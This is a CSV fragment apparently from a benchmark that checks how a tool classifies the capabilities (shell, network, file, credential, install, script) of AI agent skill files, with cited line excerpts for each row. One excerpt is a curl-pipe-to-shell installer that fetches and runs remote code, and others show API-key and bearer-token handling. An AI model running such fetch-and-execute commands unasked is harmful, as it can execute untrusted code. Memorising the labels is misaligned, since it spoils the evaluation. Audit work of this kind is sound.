+53,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/keynote-slides/SKILL.md,"CMD, NET, FS, CRED, SCRIPT","CMD, NET, CRED, INST",Partial agreement,"NET: L80 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. CRED: L80 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. SCRIPT: L190 candidate; distinguish bundled helper invocation from generic or external scripts. | Provisional FP: INST; FN: FS, SCRIPT","CMD (Yes): L190: node scripts/export-pdf.js decks/<deck-id> --out /tmp/<deck-id>.pdf
+L303: 1. **Ingest resources:** Run `node scripts/ingest-resources.js decks/<deck-id>` to read all materials
+L304: - Or use `node scripts/narrative-build.js decks/<deck-id>` to prepare model-mediated prompts
+NET (Yes): L80: 3. Save the API key and model settings to localStorage (never commit keys).
+L110: Then open `http://<tailscale-ip>:8921/decks/<deck-id>/index.html`.
+L214: 4. First-time commenters enter name and email (stored in session)
+FS (Yes): L19: 1. Run the deck bootstrap to create a deck folder:
+L236: 2. Load a `comments.json` file or enter a URL
+L73: - Copy markup from the `<template>` blocks at the bottom of the file.
+CRED (Yes): L80: 3. Save the API key and model settings to localStorage (never commit keys).
+INST (No): No supporting excerpt identified.
+SCRIPT (Yes): L190: node scripts/export-pdf.js decks/<deck-id> --out /tmp/<deck-id>.pdf
+L303: 1. **Ingest resources:** Run `node scripts/ingest-resources.js decks/<deck-id>` to read all materials
+L304: - Or use `node scripts/narrative-build.js decks/<deck-id>` to prepare model-mediated prompts",0001f6b93877d9809d0127c5d9aa3048911ceb66,widely_reused,INST,"FS, SCRIPT"
+54,https://github.com/matt-riley/agent-skills/blob/HEAD/skills/go-docker-builds/SKILL.md,"CMD, NET, FS, INST","CMD, FS, SCRIPT",Partial agreement,"CMD: L271 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. NET: L276 candidate; distinguish remote operation from URL/reference or local command. CRED: L218 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. INST: L84 candidate; distinguish installation from prerequisites or ordinary execution. | Provisional FP: SCRIPT; FN: NET, INST","CMD (Yes): L271: - Run `docker build -t test .` from the repo root and confirm the image builds without errors.
+L272: - Run `docker run --rm test` and confirm the binary starts and responds on the expected port.
+L273: - Run `docker run --rm test /server health` (or the health endpoint) to verify the health check works.
+NET (Yes): L276: - should trigger: ""Write a Dockerfile for this Go API service that builds a static binary and runs on scratch.""
+L21: - Writing a new Dockerfile for a Go service or API.
+L40: | New Dockerfile for a Go API, starting from scratch | Yes | — |
+FS (Yes): L276: - should trigger: ""Write a Dockerfile for this Go API service that builds a static binary and runs on scratch.""
+L175: For scratch images with no shell, the binary must support a `health` subcommand that exits 0 on success. For alpine images, use `wget` or the binary directly. Read [`references/health-check-patterns.md`](references/health-check-patterns.md) for alternatives.
+CRED (No): L218: password: ${{ secrets.GITHUB_TOKEN }}
+L230: - Use `${{ secrets.GITHUB_TOKEN }}` — no need for a personal access token.
+INST (Yes): L84: RUN go mod download
+L113: RUN apk add --no-cache gcc musl-dev
+L117: RUN go mod download
+SCRIPT (No): No supporting excerpt identified.",00023a9c14a0b38860b82fdfc3d37ac03dd9a98b,reused,SCRIPT,"NET, INST"
+55,https://github.com/pedroct/treit-kit-agentes/blob/HEAD/.agents/skills/intelligent-routing/SKILL.md,FS,"CMD, NET, FS, CRED, INST",Partial agreement,"NET: L15 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: CMD, NET, CRED, INST; FN: None","CMD (No): No supporting excerpt identified.
+NET (No): L15: - API, data, auth, business logic: backend-specialist
+FS (Yes): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",00027fafd88abb355b45a28a322e87b9549584db,singleton,"CMD, NET, CRED, INST",None
+56,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/octave-mythology/SKILL.md,FS,None,No agreement,CMD: L64 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. NET: L72 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: FS,"CMD (No): L64: CHRONOS::""Constant linear time pressure, deadline urgency""
+NET (No): L72: INSTEAD_OF::""Handle the API communication layer""
+FS (Yes): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",00029de8d339157c76e199ff826f58f51613f0ae,reused,None,FS
+57,https://github.com/er1chu/claude-skills-weekly/blob/HEAD/skills/decision-extractor/SKILL.md,"NET, FS",None,No agreement,"CMD: L21 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. NET: L36 is conditional/example-like; distinguish available capability from mandatory action. FS: L64 is conditional/example-like; distinguish available capability from mandatory action. | Provisional FP: None; FN: NET, FS","CMD (No): L21: 1. **Find files to scan:**
+NET (Yes): L17: - `--include-slack`: Also scan Slack for decision language (default: vault only)
+L36: 3. **Scan Slack for decisions (if --include-slack):**
+L37: - Use `mcp__playground-slack-mcp__get_messages` with action: `my_messages`
+FS (Yes): L21: 1. **Find files to scan:**
+L64: - If confirmed, use Edit tool to append to project file
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",0002bd82cf7517dcc3727f14c3976113162c3bba,reused,None,"NET, FS"
+58,https://github.com/AhmedKaram50/research/blob/HEAD/sdui/.claude/skills/bmad-pm/SKILL.md,FS,None,No agreement,No specific ambiguity documented; absence of evidence does not establish absence of capability. | Provisional FP: None; FN: FS,"CMD (No): No supporting excerpt identified.
+NET (No): No supporting excerpt identified.
+FS (Yes): L11: 1. LOAD the FULL agent file from {project-root}/_bmad/bmm/agents/pm.md
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",0002cc9fc14254a816eb9ed5dccb4e969ee47414,reused,None,FS
+59,https://github.com/5t111111/tailwind-theme-figma-variables/blob/HEAD/.github/skills/testing/SKILL.md,"CMD, FS",None,No agreement,"No specific ambiguity documented; absence of evidence does not establish absence of capability. | Provisional FP: None; FN: CMD, FS","CMD (Yes): L26: - Use the command `mise run test` to run all tests in the project
+NET (No): No supporting excerpt identified.
+FS (Yes): L18: - Write tests in separate files with the `.test.ts` extension in the same
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",0002cd77f6cf16c658799378310bf314d287ddd1,widely_reused,None,"CMD, FS"
+60,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/empirical-validation/SKILL.md,"CMD, FS",None,No agreement,"NET: L51 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: CMD, FS","CMD (Yes): L35: - Run the appropriate command or action
+L51: curl -X POST http://localhost:3000/api/login -d '{""email"":""test@test.com""}'
+L70: npm run build
+NET (No): L51: curl -X POST http://localhost:3000/api/login -d '{""email"":""test@test.com""}'
+L21: | **API Endpoints** | Command showing correct response | `run_command` |
+L48: ### API Endpoint Verification
+FS (Yes): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",0002d5305ffb1f9a59cff3a8624b2ab951a42e11,widely_reused,None,"CMD, FS"
+61,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/code-discovery/SKILL.md,FS,"CMD, NET",No agreement,"NET: L8 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: CMD, NET; FN: FS","CMD (No): No supporting excerpt identified.
+NET (No): L8: For engineering notes and entry points see [CODE.md](./CODE.md). Public API is exported from `main.ts`.
+FS (Yes): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",000343059c07758b1835365b4d3f3a3e865b762f,reused,"CMD, NET",FS
+62,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/sojustack-best-practices/SKILL.md,"CMD, FS",None,No agreement,"NET: L14 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: CMD, FS","CMD (Yes): L77: 3. Run repository validation commands from the repo root:
+L78: - `pnpm typecheck`
+L79: - `pnpm format`
+NET (No): L14: - Backend: `apps/api/` (NestJS + Drizzle ORM + Better Auth)
+L45: ## Backend Rules (`apps/api`)
+L49: - Add tables in `apps/api/src/databases/tables/{name}.table.ts`.
+FS (Yes): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",00038ee41b82f76f5161f0541a562cb493f89d02,reused,None,"CMD, FS"
+63,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/orcaflex-model-generator/SKILL.md,"CMD, FS",None,No agreement,"NET: L67 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. INST: L184 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: CMD, FS","CMD (Yes): L51: - Compatibility information for Python 3.10-3.13
+NET (No): L67: - ? **Validated**: All components meet engineering standards (DNV, API, ISO)
+L191: | `pipeline_installation/tow_installation` | Pipeline Tow & Pull-in | ?? Planned |
+L208: - **Specialized**: Riser pull-in, flexjoint, touchdown, VIV
+FS (Yes): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): L184: ### Pipeline Installation (High Priority - Planned)
+L193: ### Umbilical Installation (High Priority - Planned)
+L204: - **Structure Installation**: Jacket, topside, subsea, manifold
+SCRIPT (No): No supporting excerpt identified.",0003e7ade92e57b0930fd68597fb73c2bf267fcc,reused,None,"CMD, FS"
+64,https://github.com/PracticalSwan/agent-skills/blob/HEAD/sharing-skills/SKILL.md,"CMD, NET, FS",None,No agreement,"NET: L45 candidate; distinguish remote operation from URL/reference or local command. INST: L169 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. SCRIPT: L203 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: CMD, NET, FS","CMD (Yes): L44: git checkout main
+L45: git pull upstream main
+L46: git push origin main  # Push to your fork
+NET (Yes): L45: git pull upstream main
+L46: git push origin main  # Push to your fork
+L83: git push -u origin ""add-${skill_name}-skill""
+FS (Yes): L72: $(cat <<'EOF'
+L93: --body ""$(cat <<'EOF'
+CRED (No): No supporting excerpt identified.
+INST (No): L169: - Install GitHub CLI: https://cli.github.com/
+L202: - Codex: install or sync the folder into `$CODEX_HOME/skills/sharing-skills` and restart Codex after major changes.
+SCRIPT (No): L203: - Gemini CLI: this repository generates `/skills:sharing-skills`. Rebuild it with `python scripts/export-gemini-skill.py sharing-skills` and reload commands.",0004277d340d21eac4323f6aadf2aeaaf5c96e50,reused,None,"CMD, NET, FS"
+65,https://github.com/delightful-ai/leaven/blob/HEAD/docs/specs/leaven_py/repos/harbor/skills/create-task/SKILL.md,"CMD, NET, FS, INST","CMD, FS, SCRIPT",Partial agreement,"NET: L145 candidate; distinguish remote operation from URL/reference or local command. CRED: L59 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. INST: L64 candidate; distinguish installation from prerequisites or ordinary execution. SCRIPT: L145 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: SCRIPT; FN: NET, INST","CMD (Yes): L72: RUN apt-get update && apt-get install -y openssh-client && rm -rf /var/lib/apt/lists/*
+L145: curl -LsSf https://astral.sh/uv/0.9.7/install.sh | sh
+L270: - **Running** — the concrete `harbor run` commands (Oracle + real agent), with the
+NET (Yes): L145: curl -LsSf https://astral.sh/uv/0.9.7/install.sh | sh
+L95: - Use a separate verifier environment when grading code, dependencies, API keys,
+L229: For Reward Kit judges needing API keys:
+FS (Yes): L44: ## Step 2: Write instruction.md
+L64: Edit `environment/Dockerfile` to install dependencies the task needs. The agent works
+L394: - Forgetting to write the reward file ? task ""passes"" silently with reward 0
+CRED (No): L59: Don't make them password protected.
+INST (Yes): L64: Edit `environment/Dockerfile` to install dependencies the task needs. The agent works
+L71: # Install what the task requires — NOT the solution
+L72: RUN apt-get update && apt-get install -y openssh-client && rm -rf /var/lib/apt/lists/*
+SCRIPT (No): L145: curl -LsSf https://astral.sh/uv/0.9.7/install.sh | sh
+L186: Write `solution/solve.sh` — a script that actually solves the task. The Oracle agent runs
+L243: 1. Does `solve.sh` actually solve it? (`start-env -a -i` and run it manually)",0004314a114a096862e9a3a835acdda28b8b1692,reused,SCRIPT,"NET, INST"
+66,https://github.com/mwathiben/PropManager/blob/HEAD/.claude/skills/bats-testing-patterns/SKILL.md,"CMD, NET, FS, INST","CMD, NET, FS, CRED, INST",Partial agreement,NET: L41 candidate; distinguish remote operation from URL/reference or local command. INST: L38 candidate; distinguish installation from prerequisites or ordinary execution. SCRIPT: L43 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: CRED; FN: None,"CMD (Yes): L38: brew install bats-core
+L41: git clone https://github.com/bats-core/bats-core.git
+L46: npm install --global bats
+NET (Yes): L41: git clone https://github.com/bats-core/bats-core.git
+L571: on: [push, pull_request]
+L629: - **Bats GitHub**: https://github.com/bats-core/bats-core
+FS (Yes): L186: [ ""$(cat ""$TMPDIR/output.txt"")"" = ""expected content"" ]
+L214: # Create test directory
+L239: # Create directory structure
+CRED (No): No supporting excerpt identified.
+INST (Yes): L38: brew install bats-core
+L43: ./install.sh /usr/local
+L46: npm install --global bats
+SCRIPT (No): L43: ./install.sh /usr/local
+L45: # From npm (Node.js)
+L269: # Load shared setup from test_helper.sh",000432afe96102f283e5b82b0fa755f8d2d32c19,reused,CRED,None
+67,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/amia-github-thread-management/SKILL.md,"CMD, NET, FS, SCRIPT","CMD, NET, FS, INST, SCRIPT",Partial agreement,NET: L11 candidate; distinguish remote operation from URL/reference or local command. FS: L105 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. SCRIPT: L39 candidate; distinguish bundled helper invocation from generic or external scripts. | Provisional FP: INST; FN: None,"CMD (Yes): L31: - Python 3.8+ for running automation scripts
+L43: 5. **Track progress**: Re-run listing commands to confirm all threads have been properly addressed
+L65: | `threadId` | string | The GraphQL node ID of the affected thread (PRRT_xxx format) |
+NET (Yes): L11: tags: ""github, pull-request, code-review, thread-management""
+L13: agent: api-coordinator
+L24: This skill teaches you how to manage GitHub Pull Request review threads. Review threads are conversation containers attached to specific lines of code in a PR diff.
+FS (Yes): L100: ??? Q: Do you need to find threads that still need attention?
+L102: ??? Find all unresolved threads:
+L105: ??? Find comments without any replies:
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (Yes): L39: 1. **Identify threads requiring attention**: Use `amia_get_review_threads.py --unresolved-only` to list all unresolved threads on the PR
+L49: - [ ] Identify unresolved threads using `amia_get_review_threads.py --unresolved-only`
+L53: - [ ] For batch operations: use `amia_resolve_threads_batch.py`",00044402dc0bc6d612d79cd52f9d6b51febf3570,widely_reused,INST,None
+68,https://github.com/Abdssamie/convex-ecom/blob/HEAD/.claude/skills/convex-component-authoring/SKILL.md,"CMD, NET, FS, INST","CMD, SCRIPT",Partial agreement,"CMD: L437 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. NET: L18 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. INST: L437 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. SCRIPT: L291 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: SCRIPT; FN: NET, FS, INST","CMD (Yes): L299: ""prepublishOnly"": ""npm run build""
+L437: - Never run `npx convex deploy` unless explicitly instructed
+L438: - Never run any git commands unless explicitly instructed
+NET (Yes): L6: description: How to create, structure, and publish self-contained Convex components with proper isolation, exports, and dependency management
+L18: Before implementing, do not assume; fetch the latest documentation:
+L20: - Primary: https://docs.convex.dev/components
+FS (Yes): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (Yes): L437: - Never run `npx convex deploy` unless explicitly instructed
+SCRIPT (No): L291: ""main"": ""dist/index.js"",",00046d6e17688d6bf5908a8b19bf4fed59ed5a0d,reused,SCRIPT,"NET, FS, INST"
+69,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/fullstack-feature/SKILL.md,"CMD, FS",None,No agreement,"NET: L285 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. SCRIPT: L14 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: CMD, FS","CMD (Yes): L49: 7. **Commit + Log** - Triggered when runtime issues `complete` directives; git commit, update memory/logs, report to user
+L143: - Run ORM type generation command
+L169: - Run type generation command
+NET (No): L285: - Read both API and UI code to understand interfaces
+L327: - Write unit tests for API endpoints
+L487: - **Phase 3 (Core)**: API agent, UI agent, State agent run in parallel
+FS (Yes): L496: - Agents write results to filesystem
+L523: - Read `.goodvibes/memory/{decisions,patterns,failures}.json` in Phase 1
+L524: - Write to `.goodvibes/logs/tasks.jsonl` in Phase 7
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): L14: scripts/
+L15: validate-feature-workflow.sh
+L559: Use `scripts/validate-feature-workflow.sh` to verify your orchestration follows this workflow. See `references/phase-templates.md` for detailed templates and examples.",00047f1233836f3c38bce543a1ccd924f61b8052,widely_reused,None,"CMD, FS"
+70,https://github.com/Bryan-Roe-ai/Aria/blob/HEAD/.github/skills/aria-web-sync-workflow/SKILL.md,"CMD, FS",CMD,Partial agreement,NET: L49 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. SCRIPT: L65 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. SkillGuard prediction unavailable or recorded as None; verify original prediction before attributing an error. | Source SHA not in supplied key. | Provisional FP: None; FN: FS,"CMD (Yes): No supporting excerpt identified.
+NET (No): L49: - `POST /api/aria/execute`
+L65: - Run Aria API tests (`tests/test_aria_server.py`) and any related integration tests.
+L16: - matched API route behavior across both entry points
+FS (Yes): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): L65: - Run Aria API tests (`tests/test_aria_server.py`) and any related integration tests.
+L6: argument-hint: ""Describe the Aria endpoint or UI behavior mismatch and which entry point fails (`aria_web` vs `apps/aria/server.py`).""
+L24: - debug differences between `aria_web` and `apps/aria/server.py`",0004a0bc5b1d1e6052b0a164f9c535930aa66f8f,reused,None,FS
+71,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/test-orchestrator/SKILL.md,"CMD, FS",None,No agreement,"NET: L58 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. CRED: L59 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: CMD, FS","CMD (Yes): No supporting excerpt identified.
+NET (No): L58: integration: [""database operations"", ""API calls""]
+L109: - [ ] API integrations
+L249: async login(email: string, password: string) {
+FS (Yes): No supporting excerpt identified.
+CRED (No): L59: e2e: [""login flow"", ""password reset""]
+L249: async login(email: string, password: string) {
+L251: await this.passwordInput.fill(password);
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",0004acc951e4e6b99b0a1cf70a238e1f88900bb1,widely_reused,None,"CMD, FS"
+72,https://github.com/diegosouzapw/awesome-omni-skill/blob/HEAD/skills/business/content-marketer-majiayu000/SKILL.md,NET,None,No agreement,NET: L31 candidate; distinguish remote operation from URL/reference or local command. | Provisional FP: None; FN: NET,"CMD (No): No supporting excerpt identified.
+NET (Yes): L31: - Writing API documentation (use api-documenter)
+FS (No): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",0004cca1c493f866d7f23a8b259a14cf7e2a8862,reused,None,NET
+73,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/aspose-slides/SKILL.md,FS,None,No agreement,CMD: L102 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. NET: L590 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. INST: L11 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. | Provisional FP: None; FN: FS,"CMD (No): L102: // Find shapes by type
+NET (No): L590: 4. **Consult XML documentation** - IntelliSense provides detailed API documentation
+FS (Yes): L90: presentation.Save(""output.pptx"", SaveFormat.Pptx);
+L200: presentation.Save(""output.pptx"", SaveFormat.Pptx);
+L340: image.Save($""extracted_image_{imageIndex++}.png"");
+CRED (No): No supporting excerpt identified.
+INST (No): L11: This skill enables Claude Code to effectively manipulate Microsoft PowerPoint presentations using the Aspose.Slides.NET library. It provides comprehensive guidance for working with presentations programmatically without requiring Microsoft PowerPoint installation.
+SCRIPT (No): No supporting excerpt identified.",0005633e6138f9d906a0c4730a64ff6769158a9f,reused,None,FS
+74,https://github.com/CofficLab/Cisum/blob/HEAD/.claude/skills/i18n-translate/SKILL.md,"CMD, FS, SCRIPT","CMD, SCRIPT",Partial agreement,NET: L99 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. SCRIPT: L25 candidate; distinguish bundled helper invocation from generic or external scripts. | Provisional FP: None; FN: FS,"CMD (Yes): L18: ```bash
+L19: find . -name ""*.xcstrings"" -not -path "".*"" | head -20
+L24: ```bash
+NET (No): L99: - **????**: API, SQLite, Host ??????????
+FS (Yes): L19: find . -name ""*.xcstrings"" -not -path "".*"" | head -20
+L31: find . -name ""*.xcstrings"" -not -path "".*"" -exec python3 scripts/clean_stale.py {} \;
+L43: for f in $(find . -name ""*.xcstrings"" -not -path "".*""); do
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (Yes): L25: python3 scripts/clean_stale.py <????>.xcstrings
+L31: find . -name ""*.xcstrings"" -not -path "".*"" -exec python3 scripts/clean_stale.py {} \;
+L37: python3 scripts/check_missing.py <????>.xcstrings",0005642142821ff33d0fd8ee96ccb9ad39891319,widely_reused,None,FS
+75,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/update-google-agent-models/SKILL.md,"CMD, NET, FS, SCRIPT",SCRIPT,Partial agreement,"SCRIPT: L25 candidate; distinguish bundled helper invocation from generic or external scripts. | Provisional FP: None; FN: CMD, NET, FS","CMD (Yes): L25: - `node skills/update-agent-models/run-workflow.js --google-only`
+L27: - `node skills/update-agent-models/run-workflow.js --google-only --dry-run`
+NET (Yes): No supporting excerpt identified.
+FS (Yes): L33: - Writes proposal in `skills/update-agent-models/proposals/theseus-update.*.json`.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (Yes): L25: - `node skills/update-agent-models/run-workflow.js --google-only`
+L27: - `node skills/update-agent-models/run-workflow.js --google-only --dry-run`",00058ecd70d3f0c8dc08f917102ea1aad5a0193e,reused,None,"CMD, NET, FS"
+76,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/nock-interpreter-engineer-assistant/SKILL.md,None,None,Exact agreement,CMD: L195 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. NET: L312 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: None,"CMD (No): L195: ### Python Implementation
+NET (No): L312: - [Nock 4K Specification](https://github.com/urbit/urbit/blob/main/pkg/arvo/sys/zuse.hoon)
+FS (No): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",00059ac34d83b8b93959a08aaa26718605f7f16b,reused,None,None
+77,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/direnv/SKILL.md,"CMD, FS, CRED","CMD, FS, CRED, INST",Partial agreement,NET: L236 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. CRED: L20 candidate; distinguish real secret retrieval/use from placeholders or configuration guidance. INST: L331 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. SCRIPT: L95 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: INST; FN: None,"CMD (Yes): L90: # Python virtual environment
+L107: ### Python Projects
+L110: # .envrc for Python with uv/pip
+NET (No): L236: # /monorepo/services/api/.envrc
+L242: export SERVICE_NAME=""api""
+FS (Yes): L79: # Load from .env file
+L127: # Load secrets from local file
+CRED (Yes): L20: export API_KEY=""dev-key-only""
+L47: export API_KEY=""sk-real-production-key""
+L256: : ""${API_KEY:?API_KEY must be set}""
+INST (No): L331: # Install direnv (macOS)
+L332: brew install direnv
+L334: # Install direnv (Ubuntu/Debian)
+SCRIPT (No): L95: # Node.js
+L131: ### Node.js Projects
+L134: # .envrc for Node.js",0005a6cf513878a553760f49186e5fa55bcf90f9,reused,INST,None
+78,https://github.com/Cheggin/request-for-startups/blob/HEAD/skills/social-media/SKILL.md,FS,None,No agreement,NET: L15 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: FS,"CMD (No): No supporting excerpt identified.
+NET (No): L15: Create social media posts for Twitter/X and LinkedIn that promote the startup. Posts use the brand voice, are adapted per platform norms, and follow a consistent publishing cadence.
+L38: **LinkedIn**: Professional, detailed tone. Three-paragraph structure works well for announcements. Include a call to action and link to the blog post or product page.
+L42: ### 4. Schedule and Publish
+FS (Yes): L21: Read SOUL.md and brand guidelines to determine voice, tone, and visual identity. All posts must reflect the documented brand personality.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",0005ab29a9ecee9a41bc056c5864d009054020d5,reused,None,FS
+79,https://github.com/jukeyman/jukeyman-skills/blob/HEAD/skills/saas-packs--castai-pack--castai-install-auth/SKILL.md,"CMD, NET, FS, CRED, INST","CMD, NET, CRED",Partial agreement,"NET: L6 candidate; distinguish remote operation from URL/reference or local command. CRED: L6 candidate; distinguish real secret retrieval/use from placeholders or configuration guidance. INST: L4 candidate; distinguish installation from prerequisites or ordinary execution. | Provisional FP: None; FN: FS, INST","CMD (Yes): L10: ""cast ai setup"", ""cast ai api key"", ""cast ai helm install"".
+L42: curl -s -H ""X-API-Key: ${CASTAI_API_KEY}"" \
+L54: helm upgrade --install castai-agent castai-helm/castai-agent \
+NET (Yes): L6: Install and configure CAST AI agent on a Kubernetes cluster with API key authentication.
+L10: ""cast ai setup"", ""cast ai api key"", ""cast ai helm install"".
+L36: Log in to https://console.cast.ai and navigate to **API** > **API Access Keys**. Create a Full Access key for Terraform-managed clusters, or Read-Only for monitoring-only.
+FS (Yes): No supporting excerpt identified.
+CRED (Yes): L6: Install and configure CAST AI agent on a Kubernetes cluster with API key authentication.
+L10: ""cast ai setup"", ""cast ai api key"", ""cast ai helm install"".
+L42: curl -s -H ""X-API-Key: ${CASTAI_API_KEY}"" \
+INST (Yes): L4: name: castai-install-auth
+L6: Install and configure CAST AI agent on a Kubernetes cluster with API key authentication.
+L9: Trigger with phrases like ""install cast ai"", ""connect cluster to cast ai"",
+SCRIPT (No): No supporting excerpt identified.",0005e6a6954312a438e8096861bd9d8d83c6bbcc,reused,None,"FS, INST"
+80,https://github.com/aashari/ai-agent-skills/blob/HEAD/skills/apple-mail/mail-search/SKILL.md,"CMD, FS","CMD, FS, SCRIPT",Partial agreement,CMD: L74 is conditional/example-like; distinguish available capability from mandatory action. NET: L86 is conditional/example-like; distinguish available capability from mandatory action. FS: L74 is conditional/example-like; distinguish available capability from mandatory action. SCRIPT: L76 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: SCRIPT; FN: None,"CMD (Yes): L74: If user wants to read specific results, find the emlx and parse:
+L30: ```bash
+L75: ```bash
+NET (No): L86: Offer to read any specific email if user asks.
+L73: ## Reading Email Bodies
+L6: Search Apple Mail across all synced accounts by keyword, subject, sender, or any combination. Use when user asks to find an email, search for a message, or look for something in their mail. Arguments: search terms, optionally with sender:, subject:, from:, account: prefixes, and time filters like ""l
+FS (Yes): L74: If user wants to read specific results, find the emlx and parse:
+L6: Search Apple Mail across all synced accounts by keyword, subject, sender, or any combination. Use when user asks to find an email, search for a message, or look for something in their mail. Arguments: search terms, optionally with sender:, subject:, from:, account: prefixes, and time filters like ""l
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): L76: python3 ~/.claude/skills/_mail-shared/parser.py <ROWID>",0006158d541a256a54b052cf574c317e528f9214,reused,SCRIPT,None
+81,https://github.com/dvcrn/openclaw-skills-marketplace/blob/HEAD/plugins/azep-ninja--tator-trader/skills/tator-trader/SKILL.md,"CMD, NET, CRED","CMD, NET, CRED",Exact agreement,NET: L146 candidate; distinguish remote operation from URL/reference or local command. CRED: L138 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. SCRIPT: L212 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. | Provisional FP: None; FN: None,"CMD (Yes): L152: curl -sS -X POST ""https://api.wallet.paysponge.com/api/x402/fetch"" \
+L151: ```bash
+NET (Yes): L146: | Need programmatic signing (viem, ethers, @x402/fetch, Solana) | See `references/REFERENCE.md` | ?? Advanced — read security notes |
+L152: curl -sS -X POST ""https://api.wallet.paysponge.com/api/x402/fetch"" \
+L5: description: ""Execute crypto trades using natural language via Tator's AI trading API. Use when: buying tokens, selling tokens, swapping, bridging cross-chain, sending tokens, wrapping/unwrapping ETH, opening perp positions, betting on prediction markets, launching tokens, registering blockchain nam
+FS (No): No supporting excerpt identified.
+CRED (Yes): L138: > **?? Wallet Security:** Tator does NOT require your private key. The x402 payment uses YOUR agent's existing wallet. Use a **managed wallet service** to avoid raw key exposure entirely.
+L153: -H ""Authorization: Bearer $SPONGE_API_KEY"" \
